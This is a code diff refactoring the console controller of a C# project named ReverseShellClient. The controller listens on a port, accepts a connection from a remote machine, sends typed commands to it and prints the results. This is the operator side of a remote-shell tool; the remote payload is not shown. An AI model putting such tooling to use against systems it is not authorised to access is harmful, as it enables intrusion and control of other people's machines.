@@ -1,38 +1,21 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.IO;
 using System.Linq;
-using System.Net;
-using System.Net.Sockets;
-using System.Text;
 using System.Threading.Tasks;
 using Commands;
+using NetworkManager;
 using Shared;
 
 namespace ReverseShellClient
 {
     public class ClientManager
     {
-        Socket socketForServer;
-        NetworkStream networkStream;
-        StreamWriter streamWriter;
-        StreamReader streamReader;
-        BinaryWriter binaryWriter;
-        BinaryReader binaryReader;
-        StringBuilder strInput;
-        TcpListener tcpListener;
-
-        ClientTools tools;
-        bool connected;
         bool processingCommand;
-        string toolsFilePath;
 
 
         public ClientManager()
         {
-            connected = false;
             processingCommand = false;
-            toolsFilePath = "";
             Console.ForegroundColor = ConsoleColor.Green;
         }
 
@@ -57,55 +40,35 @@ namespace ReverseShellClient
                     }
                 }
 
-                StartListen(port);
+                // Listen and start connection
+                GlobalNetworkManager.clientNetworkManager.ListenAndConnect(port);
 
+                // Process data sent by the server in a new task
+                var runClient = new Task(ProcessIncomingData);
+                runClient.Start();
+
+                // Process user input
+                ProcessInput();
+
+                // Connection ended, ask if listen again
                 listen = AskListenAgain();
             }
         }
 
 
-        void StartListen(int port)
+        void ProcessIncomingData()
         {
-            tcpListener = new TcpListener(IPAddress.Any, port);
-            tcpListener.Start();
-
-            Console.Clear();
-            ColorTools.WriteCommandMessage("Listening on port " + port + " ...");
-            // Wait for an incoming connection
-            socketForServer = tcpListener.AcceptSocket();
-            connected = true;
-
-            var runClient = new Task(RunClient);
-            runClient.Start();
-
-            ProcessInput();
-        }
-
-
-        void RunClient()
-        {
-            networkStream = new NetworkStream(socketForServer);
-            streamReader = new StreamReader(networkStream);
-            streamWriter = new StreamWriter(networkStream);
-            binaryWriter = new BinaryWriter(networkStream);
-            binaryReader = new BinaryReader(networkStream);
-            strInput = new StringBuilder();
-
-            tools = new ClientTools(binaryWriter, binaryReader, streamWriter, streamReader);
-
-            ColorTools.WriteCommandMessage("Connected to " + (IPEndPoint)socketForServer.RemoteEndPoint + "\n");
-
-            tools.SayHello();
-
-
-            // Listening loop
             while (true)
             {
                 try
                 {
-                    strInput.Append(streamReader.ReadLine());
+                    var data = GlobalNetworkManager.ReadLine();
+                    if (data == null)
+                    {
+                        continue;
+                    }// to remove ??
 
-                    var command = CommandsManager.GetCommandByFlag(strInput.ToString());
+                    var command = CommandsManager.GetCommandByFlag(data);
                     if (command != null)
                     {
                         // Call client method
@@ -116,17 +79,17 @@ namespace ReverseShellClient
                     {
                         // Normal output (text)
                         // Check if the line isn't the one representing the path in the cmd
-                        if (!(strInput[strInput.Length - 1] == '>' && strInput.ToString().Contains(@":\")))
+                        if (!(data[data.Length - 1] == '>' && data.Contains(@":\")))
                         {
                             // Add line return
-                            strInput.Append("\r\n");
+                            Console.WriteLine(data);
                         }
-
-                        // Display received data
-                        Console.Write(strInput.ToString());
+                        else
+                        {
+                            // Display cmd path without line return
+                            Console.Write(data);
+                        }
                     }
-                    
-                    strInput.Remove(0, strInput.Length);
                 }
                 catch (Exception)
                 {
@@ -147,56 +110,58 @@ namespace ReverseShellClient
                     continue;
                 }
 
-                var command = Console.ReadLine();
+                var commandString = Console.ReadLine();
 
                 // If the connection was closed, break from the loop
-                if (!connected)
+                if (!GlobalNetworkManager.clientNetworkManager.IsConnected())
                 {
                     break;
                 }
 
 
-                if (command == "clear" || command == "cls")
+                if (commandString == "clear" || commandString == "cls")
                 {
                     // Clear console
                     Console.Clear();
-                    tools.SayHello();
+                    GlobalNetworkManager.SayHello();
                 }
-                else if (command == "")
+                else if (commandString == "")
                 {
-                    tools.SayHello();
+                    GlobalNetworkManager.SayHello();
                 }
                 else
                 {
-                    var splittedCommand = command.Split(' ').ToList();
+                    var splittedCommand = commandString.Split(' ').ToList();
                     var commandName = splittedCommand[0];
-                    var arguments = new List<string>();
 
-                    if (splittedCommand.Count == 1)
+                    var command = CommandsManager.GetCommandByName(commandName);
+                    if (command != null)
                     {
-                        arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
-                    }
+                        var arguments = new List<string>();
 
-                    var commandClass = CommandsManager.GetCommandByName(commandName);
-                    if (commandClass != null)
-                    {
-                        if (command.Contains("help")){
+                        if (splittedCommand.Count == 1)
+                        {
+                            arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
+                        }
+
+
+                        if (commandString.Contains("help")){
                             // Help commands section
-                            if (arguments.Count == 1 && arguments[1] == "help")
-                            {
-                                CommandsManager.ShowCommandHelp(commandClass);
-                            }
-                            else
+                            if (commandString == "help")
                             {
                                 CommandsManager.ShowGlobalHelp();
                             }
+                            else
+                            {
+                                CommandsManager.ShowCommandHelp(command);
+                            }
 
-                            tools.SayHello();
+                            GlobalNetworkManager.SayHello();
                             continue;
                         }
 
 
-                        if (!CommandsManager.CheckCommandSyntax(commandClass, arguments))
+                        if (!CommandsManager.CheckCommandSyntax(command, arguments))
                         {
                             ColorTools.WriteCommandError($"Syntax error, check out the command's help page ({commandName} help)");
                             continue;
@@ -206,7 +171,7 @@ namespace ReverseShellClient
                         var preProcessResult = true;
                         try
                         {
-                            preProcessResult = commandClass.PreProcessCommand(arguments);
+                            preProcessResult = command.PreProcessCommand(arguments);
                         }
                         catch (NotImplementedException)
                         {
@@ -216,15 +181,15 @@ namespace ReverseShellClient
                         if (!preProcessResult)
                         {
                             // Error in the PreProcess method
-                            tools.SayHello();
+                            GlobalNetworkManager.SayHello();
                             continue;
                         }
 
 
-                        if (commandClass.isLocal)
+                        if (command.isLocal)
                         {
-                            commandClass.ClientMethod(arguments);
-                            tools.SayHello();
+                            command.ClientMethod(arguments);
+                            GlobalNetworkManager.SayHello();
                             continue;
                         }
                         
@@ -234,8 +199,7 @@ namespace ReverseShellClient
                     }
 
                     // Send the data to the server
-                    streamWriter.WriteLine(command);
-                    streamWriter.Flush();
+                    GlobalNetworkManager.WriteLine(commandString);
                 }
             }
         }
@@ -253,23 +217,13 @@ namespace ReverseShellClient
 
         void Cleanup()
         {
-            ColorTools.WriteWarning(processingCommand ? "\nDisconnected, operation stopped [ENTER]" : "\nDisconnected [ENTER]");
-
-            connected = false;
-
             try
             {
-                streamReader.Close();
-                streamWriter.Close();
-                binaryReader.Close();
-                binaryWriter.Close();
-                networkStream.Close();
-                socketForServer.Close();
-                tcpListener.Stop();
+                GlobalNetworkManager.clientNetworkManager.Cleanup(processingCommand);
             }
             catch (Exception)
             {
-                // ignored
+                // Ignored
             }
         }
     }
